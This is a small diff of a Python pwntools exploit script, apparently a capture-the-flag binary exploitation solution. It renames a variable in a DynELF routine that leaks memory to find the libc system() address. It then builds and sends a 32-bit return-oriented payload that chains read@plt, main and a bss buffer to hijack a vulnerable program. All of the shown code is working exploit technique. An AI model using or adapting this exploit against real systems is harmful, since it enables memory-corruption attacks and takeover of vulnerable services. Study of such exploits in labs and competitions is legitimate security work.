@@ -17,8 +17,8 @@ def leak(address):
     return leaked
 
 
-d = DynELF(leak, elf=elf)
-system_addr = d.lookup('system', 'libc')
+libc = DynELF(leak, elf=elf)
+system_addr = libc.lookup('system', 'libc')
 log.success('system_address => %#x' % system_addr)
 payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
 io.send(payload)
